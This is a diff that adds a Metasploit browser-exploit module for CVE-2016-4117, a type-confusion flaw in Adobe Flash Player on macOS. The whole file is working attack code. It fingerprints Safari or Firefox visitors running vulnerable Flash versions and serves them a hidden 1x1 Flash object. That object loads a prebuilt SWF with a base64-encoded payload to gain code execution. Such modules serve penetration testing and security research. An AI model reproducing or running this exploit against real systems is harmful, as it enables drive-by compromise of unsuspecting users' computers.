@@ -1,0 +1,127 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  include Msf::Exploit::Remote::BrowserExploitServer
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'                => 'Adobe Flash Player DeleteRangeTimelineOperation Type-Confusion',
+      'Description'         => %q(
+       This module exploits a type confusion on Adobe Flash Player, which was
+       originally found being successfully exploited in the wild. This module
+       has been tested successfully on:
+         macOS Sierra 10.12.3,
+         Safari and Adobe Flash Player 21.0.0.182,
+         Firefox and Adobe Flash Player 21.0.0.182.
+      ),
+      'License'             => MSF_LICENSE,
+      'Author'              =>
+        [
+          'Genwei Jiang', # FireEye original blog details on the vulnerability
+          'bcook-r7'      # Imported Metasploit module
+        ],
+      'References'          =>
+        [
+          ['CVE', '2016-4117'],
+          ['BID', '90505'],
+          ['URL', 'https://www.fireeye.com/blog/threat-research/2016/05/cve-2016-4117-flash-zero-day.html'],
+          ['URL', 'http://www.securitytracker.com/id/1035826'],
+          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsa16-02.html'],
+          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb16-15.html'],
+        ],
+      'Payload'             =>
+        {
+          'DisableNops' => true
+        },
+      'Platform'            => ['osx'],
+      'BrowserRequirements' =>
+        {
+          source: /script|headers/i,
+          os_name: lambda do |os|
+            os =~ OperatingSystems::Match::MAC_OSX
+          end,
+          ua_name: lambda do |ua|
+            case target.name
+            when 'Mac OS X'
+              return true if ua == Msf::HttpClients::SAFARI
+              return true if ua == Msf::HttpClients::FF
+            end
+
+            false
+          end,
+          flash: lambda do |ver|
+            case target.name
+            when 'Mac OS X'
+              return true if Gem::Version.new(ver) <= Gem::Version.new('21.0.0.182')
+            end
+
+            false
+          end
+        },
+      'Targets'             =>
+        [
+          [
+            'Mac OS X', {
+              'Platform' => 'osx',
+              'Arch' => ARCH_X64
+            }
+          ]
+        ],
+      'Privileged'          => false,
+      'DisclosureDate'      => 'Apr 27 2016',
+      'DefaultTarget'       => 0))
+  end
+
+  def exploit
+    @swf = create_swf
+
+    super
+  end
+
+  def on_request_exploit(cli, request, target_info)
+    print_status("Request: #{request.uri}")
+
+    if request.uri.end_with? 'swf'
+      print_status('Sending SWF...')
+      send_response(cli, @swf, 'Content-Type' => 'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache')
+      return
+    end
+
+    print_status('Sending HTML...')
+    send_exploit_html(cli, exploit_template(cli, target_info), 'Pragma' => 'no-cache')
+  end
+
+  def exploit_template(cli, target_info)
+    swf_random = "#{rand_text_alpha(3..7)}.swf"
+    target_payload = get_payload(cli, target_info)
+    b64_payload = Rex::Text.encode_base64(target_payload)
+
+    if target.name.include? 'osx'
+      platform_id = 'osx'
+    end
+    html_template = %(<html>
+    <body>
+    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
+    <param name="movie" value="<%=swf_random%>" />
+    <param name="allowScriptAccess" value="always" />
+    <param name="FlashVars" value="sh=<%=b64_payload%>&pl=<%=platform_id%>" />
+    <param name="Play" value="true" />
+    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>&pl=<%=platform_id%>" Play="true"/>
+    </object>
+    </body>
+    </html>
+    )
+
+    return html_template, binding
+  end
+
+  def create_swf
+    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2016-4117', 'msf.swf')
+    File.binread(path)
+  end
+end
